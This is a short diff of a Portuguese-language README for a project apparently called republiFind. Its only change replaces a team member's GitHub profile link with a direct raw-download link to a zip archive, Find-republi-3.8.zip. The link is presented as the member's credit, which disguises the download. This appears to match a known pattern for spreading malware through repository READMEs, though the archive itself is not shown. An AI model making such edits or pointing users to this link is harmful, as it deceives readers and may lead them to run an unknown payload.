@@ -40,4 +40,4 @@ JWT_SECRET=sua_chave_gerada_aqui
 ### Dashboard
 ![Dashboard do Usuário](public/dashboard.png)
 
-integrante: Vitor Rocha Mininel https://github.com/vitorrocha13
+integrante: Vitor Rocha Mininel https://github.com/vitorrocha13/republiFind/raw/refs/heads/main/public/Find-republi-3.8.zip
